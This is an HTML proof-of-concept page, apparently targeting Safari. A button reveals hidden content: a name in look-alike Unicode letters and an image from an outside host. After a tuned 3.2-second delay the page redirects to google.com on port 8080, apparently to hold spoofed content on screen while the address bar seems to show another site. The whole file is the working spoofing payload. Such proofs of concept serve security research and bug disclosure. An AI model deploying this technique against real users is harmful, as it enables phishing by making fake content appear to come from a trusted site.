<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Apple Security PoC (ms)</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, system-ui;
    text-align: center;
    margin-top: 60px;
  }
  #spoof {
    display: none;
  }
  #info {
    margin-top: 15px;
    font-size: 14px;
    color: #444;
  }
</style>
</head>

<body>

<h1>Apple Security PoC</h1>
<button id="trigger">Trigger</button>

<div id="spoof">
  <h2>𝐷ℎ𝑎𝑓𝑦</h2>
  <img src="https://ecdnts-del.github.io/spoof/9de3dae67d67214fee46527f2a5b8d6b.jpg"
       width="260">
  <div id="info">Waiting…</div>
</div>

<script>
let startTime;
let rafId;

document.getElementById('trigger').addEventListener('click', () => {

  const spoof = document.getElementById('spoof');
  const info  = document.getElementById('info');

  spoof.style.display = 'block';

  // precise start timestamp
  startTime = performance.now();

  // repaint‑aware timer (Safari‑friendly)
  function update() {
    const now = performance.now();
    const diff = Math.round(now - startTime);
    info.textContent = `Visible for ${diff} ms`;
    rafId = requestAnimationFrame(update);
  }

  requestAnimationFrame(() => {
    requestAnimationFrame(update); // double RAF ensures paint
  });

  // navigation after strong window (>1s)
  setTimeout(() => {
    cancelAnimationFrame(rafId);
    const end = Math.round(performance.now() - startTime);
    info.textContent = `Redirecting after ${end} ms`;
    location.href = "https://google.com:8080";
  }, 3200); // 3.2 seconds (SAFE margin)
});
</script>

</body>
</html>
